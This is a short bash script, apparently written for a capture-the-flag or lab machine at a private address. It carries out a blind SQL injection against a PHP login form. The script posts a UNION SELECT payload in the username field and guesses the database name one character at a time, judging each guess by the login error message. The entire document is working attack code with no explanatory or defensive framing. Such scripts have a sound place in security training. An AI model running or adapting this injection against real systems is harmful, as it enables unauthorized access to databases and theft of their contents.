#!/bin/bash
IP=10.10.38.133
URL="http://${IP}/index.php"
DB_NAME=""
END_SEARCH=0

while [ $END_SEARCH == 0 ]; 
do
	for letter in {a..z} {A..Z} {0..9}
	do
		RES=$(curl -s -X POST $URL -d "username=Kitty' UNION SELECT 1,2,3,4 where database() like '${DB_NAME}${letter}%' -- -&password=a" | grep "Invalid username or password")
		# echo "Response: ${RES}"
		if [ -n "$RES" ]; then
			echo "${letter} is present"
			DB_NAME="${DB_NAME}${letter}"
			echo $DB_NAME
			break
		elif [ $letter == 9 ]; then
			END_SEARCH=1
		# else
		# 	echo "Letter ${letter} is not here!"
		fi
		# if loop through all accurence then stop
	done
done

echo "Database name is : ${DB_NAME}"
